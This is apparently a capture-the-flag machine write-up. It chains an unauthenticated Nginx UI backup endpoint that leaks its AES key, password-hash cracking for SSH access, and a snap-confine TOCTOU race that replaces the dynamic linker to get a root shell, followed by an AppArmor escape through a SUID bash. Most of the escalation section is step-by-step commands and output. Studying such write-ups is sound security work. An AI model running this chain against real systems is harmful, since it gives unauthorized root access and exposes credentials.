The `admin` vhost runs Nginx UI 2.3.2, which exposes an unauthenticated backup endpoint (CVE-2026-27944) that leaks the AES key and IV in a response header, allowing the encrypted backup to be downloaded and fully decrypted — recovering the application's bcrypt password hashes. Cracking `jonathan`'s hash yields SSH access and `user.txt`. Privilege escalation abuses a TOCTOU race in the SUID-root `snap-confine` binary (CVE-2026-3888) to hijack the dynamic linker inside a snap mount namespace, execute a root shell, and then escape the firefox snap's AppArmor confinement to a full root on the host.

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify the application stack worth attacking.

### Host Discovery

Reachability and an OS hint via ICMP:


A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

## Exploitation

### CVE-2026-27944 — Nginx UI Unauthenticated Backup Download & Key Disclosure

Nginx UI's backup feature produces an AES-256-CBC-encrypted archive of its configuration and internal database. The vulnerability is twofold: the `/api/backup` endpoint requires **no authentication**, and the server returns the encryption **key and IV in the `X-Backup-Security` response header** alongside the ciphertext (formatted as `base64_key:base64_iv`). Shipping the decryption material in the same response as the encrypted data means the encryption provides no confidentiality at all — anyone who can reach the endpoint can download and decrypt the backup. The issue is documented in the project's security advisory [GHSA-g9w5-qffc-6762](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762).

A public proof-of-concept automates the flow: it issues an unauthenticated `GET` to `/api/backup`, parses the key/IV out of the `X-Backup-Security` header, and AES-256-CBC-decrypts each member of the archive. I ran it against the admin vhost:


## Privilege Escalation — `jonathan` → `root`

With a shell as `jonathan`, the escalation enumeration quickly pointed at snap. The `snapd` daemon runs as root, and its helper `snap-confine` — the SUID-root binary that sets up a snap's sandbox before launch — is a well-known escalation surface:

```bash
ps -aux | grep snapd
root  1566  0.0  0.8 1917076 32172 ?  Ssl  09:40  0:02 /usr/lib/snapd/snapd
```

The host is Ubuntu 24.04.4 LTS running snap 2.63.1, which matches the affected range for **CVE-2026-3888**:

```bash
cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.4 LTS"
VERSION_ID="24.04"

snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

### Understanding the Vulnerability

`snap-confine` is SUID-root and runs *before* any snap launches, building the sandbox that will contain it. Part of that setup involves constructing writable copies of read-only system directories — snapd calls these **mimics**. There is a **TOCTOU** (Time-Of-Check to Time-Of-Use) window between the moment `snap-confine` prepares a mimic and the moment it, acting as root, re-mounts that copy inside the namespace. An attacker who can swap the contents of the copy inside that window ends up owning `ld-linux-x86-64.so.2` — the dynamic linker — inside the namespace.

That ownership is catastrophic. When the kernel executes a SUID binary, it reads the binary's `PT_INTERP` header to locate the dynamic linker and maps it in *before* handing control to the program. If that linker path resolves to an attacker-controlled file inside the poisoned namespace, the kernel maps the attacker's shellcode and runs it with `euid=0`. In other words: own the linker inside the namespace, then run any dynamically-linked SUID binary there, and your code executes as root.

The exploit has a precondition that shapes the whole attack. Triggering a fresh mimic re-mount requires a **stale `.snap` directory** in the sandbox's `/tmp`. On a default Ubuntu 24.04, the `systemd-tmpfiles` cleanup that makes `.snap` stale only fires after **30 days**. On this box, however, the cleanup interval was deliberately shortened — the timer override runs cleanup every minute, and the tmpfiles rule ages `/tmp` contents out after just 4 minutes:

```bash
cat /etc/systemd/system/systemd-tmpfiles-clean.timer.d/override.conf
[Timer]
OnBootSec=1m
OnUnitActiveSec=1m

cat /usr/lib/tmpfiles.d/tmp.conf
# Clear tmp directories separately, to make them easier to override
D /tmp 1777 root root 4m
```

That single hardening tweak — meant to keep `/tmp` tidy — is exactly what makes the 30-day precondition reachable in minutes.

One more obstacle: the sandbox's private tmp, `/tmp/snap-private-tmp/`, is `mode 700 root:root`, so it can't be entered directly. That check is bypassed through `/proc/PID/cwd`, which follows a process's working directory through its mount namespace and sidesteps the host-level permission check.

The exploitation follows the multi-phase public PoC published at [github.com/nomaisthere/CVE-2026-3888](https://github.com/nomaisthere/CVE-2026-3888). It uses three concurrent SSH sessions.

### Stage 1 — Compiling the Exploit Tools

Two small programs are needed. `librootshell.c` is a minimal, statically-linked ELF built with raw x86_64 syscalls — it is the payload that replaces `ld-linux-x86-64.so.2` inside the poisoned namespace. When mapped as the "linker" for a SUID binary, it calls `setreuid(0,0)` and `setregid(0,0)`, then `execve("/tmp/sh", ...)` to drop into a planted busybox shell as root:

```bash
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
```

`firefox_2404.c` is the race helper. It recreates `.snap` with ~285 attacker-owned library copies pulled from `/snap/core22/current/usr/lib/x86_64-linux-gnu`, launches `snap-confine` with its stderr throttled (via AF_UNIX backpressure) so the trigger message can be read byte by byte, detects that trigger, and atomically swaps the directories with `renameat2(RENAME_EXCHANGE)` at exactly the right instant:

```bash
gcc -O2 -static -o firefox_2404 firefox_2404.c
```

### Stage 2 — Establishing the Stale `.snap` Precondition (Terminal 1)

The first session enters the firefox snap sandbox. The `systemd-run` wrapper is required so the process lands in a cgroup that satisfies snap's launch checks:

```bash
systemd-run --user --scope --unit=snap.init$(date +%s) \
  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
  --base core22 snap.firefox.hook.configure /bin/bash
```

Inside the sandbox the filesystem view differs from the host — this shell's `/tmp` is really `/tmp/snap-private-tmp/snap.firefox/tmp/` on the host. I confirmed the `.snap` directory existed and noted the shell's PID for later:

```bash
cd /tmp
stat ./.snap
# Access: (0755/drwxr-xr-x)  Uid: (0/root)  Gid: (0/root)
echo $$
# 3424
```

The trick now is to keep `/tmp` itself "fresh" so systemd-tmpfiles won't reap it, while letting `.snap` age out and be deleted. A one-second `touch` loop on `/tmp` does exactly that, and exits on its own once `.snap` is gone:

```bash
# Touch /tmp every second to refresh its timestamps; never touch .snap
while test -d ./.snap; do
    touch ./
    sleep 1
done
# Loop exits silently when systemd-tmpfiles deletes .snap
```

This terminal is left running.

### Stage 3 — Winning the Race (Terminal 2)

Once the Terminal 1 loop exits (`.snap` is now stale/deleted), a second SSH session moves in immediately. The sandbox `/tmp` is reached via the saved PID's `cwd`, bypassing the `700 root:root` permission on `/tmp/snap-private-tmp/`:

```bash
cd /proc/3424/cwd
ls -la
# drwxrwxrwt ...  (this is /tmp inside the sandbox)
```

The previous sandbox invocation cached a mount namespace; it has to be torn down — while preserving `/tmp` underneath — so the next `snap-confine` run creates a *fresh* one and re-runs the mimic sequence. Passing an invalid base (`--base snapd`) destroys the namespace without succeeding, which is exactly what's wanted:

```bash
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
  "env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
  --base snapd snap.firefox.hook.configure /nonexistent; exit"
# cannot perform operation: mount --rbind /dev ... No such file or directory
```

The error is intentional. With the namespace reset, the race helper runs from inside the sandbox `/tmp`:

```bash
~/firefox_2404 ~/librootshell.so
[*] CVE-2026-3888 - firefox 24.04 helper
[*] Setting up .snap and .exchange directory...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[*] Starting race against snap-confine...
[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE! Race won.
[+] Race won! Our libraries are in the namespace.
```

The swap landed in the TOCTOU window. Ownership of the dynamic linker inside the namespace is confirmed:

```bash
cat /proc/3424/cwd/race_perms.txt
# jonathan:jonathan 755
# → we own ld-linux-x86-64.so.2 inside the namespace
```

This terminal is also left running — closing it would tear down the poisoned namespace.

### Stage 4 — Hijacking the Linker and Spawning a Root Shell (Terminal 3)

A third SSH session drives the final steps. The race helper spawned a process inside the poisoned namespace and recorded its PID; `/proc/PID/root` then exposes that namespace's root filesystem:

```bash
PID=$(cat /proc/3424/cwd/race_pid.txt)
cd /proc/$PID/root
stat -c '%U:%G %a' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
# jonathan:jonathan 755
```

Because I own the linker path, I plant a static busybox as the target of the payload's `execve` and overwrite `ld-linux-x86-64.so.2` with the `librootshell.so` shellcode:

```bash
# Static busybox becomes /tmp/sh (no ld-linux dependency)
cp /usr/bin/busybox ./tmp/sh
# Replace the dynamic linker with our shellcode
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

Now any dynamically-linked SUID binary executed in this namespace will load the shellcode instead of the real linker. `snap-confine` itself fits the bill — it is SUID-root and dynamically linked — so executing it here is the trigger:

```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
  --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)

/ # id
uid=0(root) gid=1000(user) groups=1000(user)
```

The kernel set `euid=0` on the SUID binary, mapped our poisoned linker, and our shellcode called `setreuid(0,0)` before `execve`-ing busybox — a root shell.

### Stage 5 — Escaping the AppArmor Sandbox

This root shell is still confined by the firefox snap's AppArmor profile, so direct reads of `/etc/shadow` and other host resources are denied. The profile does, however, explicitly permit writes to `/var/snap/firefox/common/`. That writable, allowed path is the escape hatch: I copied `bash` there and set it SUID-root from inside the confined shell, where I still have root:

```bash
# Inside the busybox root shell:
cp /bin/bash /var/snap/firefox/common/bash
chmod 04755 /var/snap/firefox/common/bash
exit
```

Back in Terminal 3, *outside* the AppArmor confinement, running that SUID bash with `-p` preserves the root euid and drops to an unconfined root context on the host:

```bash
/var/snap/firefox/common/bash -p
bash-5.2# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
bash-5.2# cat /etc/shadow
root:$y$j9T$...
bash-5.2# cat /root/root.txt
REDACTED
```

Full root on the host.

## Key Takeaways

- **A backup that ships its own decryption key is not encrypted.** Returning the AES key and IV in the same response as the ciphertext (`X-Backup-Security`) reduces AES-256 to obfuscation. Key material must live somewhere the requester cannot already reach; co-locating it with the data defeats the entire scheme.

- **Management and admin APIs must never assume network-level trust.** An unauthenticated `/api/backup` on an admin panel hands the full application state to anyone who can resolve the vhost. Every state-exposing endpoint needs its own authorization check, independent of where it's "supposed" to be reachable from.

- **bcrypt's work factor protects strong passwords, not dictionary words.** The slow KDF makes brute force expensive, but `linkinpark` is in `rockyou`, so it fell in seconds. Password policy — not hash choice — is what stops this.

- **Application backups are a credential-reuse goldmine.** The same person who administers the app often owns the matching system account. Cracking any application hash should be immediately followed by trying it against SSH and other services.

- **SUID + a TOCTOU window is a root primitive, not a bug to shrug off.** `snap-confine` performs privileged mount operations on paths an attacker can influence; winning the race to swap the dynamic linker turns "runs a SUID helper" into "runs my shellcode as root" via the kernel's `PT_INTERP` handling.

- **Defensive hardening can enable offense.** Shortening the `systemd-tmpfiles` cleanup interval to keep `/tmp` tidy is exactly what collapsed CVE-2026-3888's 30-day precondition into a few minutes. Timing and cleanup settings are part of the attack surface.

- **`/proc/PID/cwd` and `/proc/PID/root` bypass directory permission checks.** They resolve paths through a target process's mount namespace, sidestepping the `700 root:root` guard on `/tmp/snap-private-tmp/`. Restrictive directory modes are not a boundary when a same-user process is inside.

- **AppArmor confinement is defense-in-depth, not a hard root boundary.** Any writable path the profile permits — here `/var/snap/firefox/common/` — becomes an escape hatch once code runs as root inside the sandbox. A SUID binary written to an allowed path carries privilege straight past the profile.
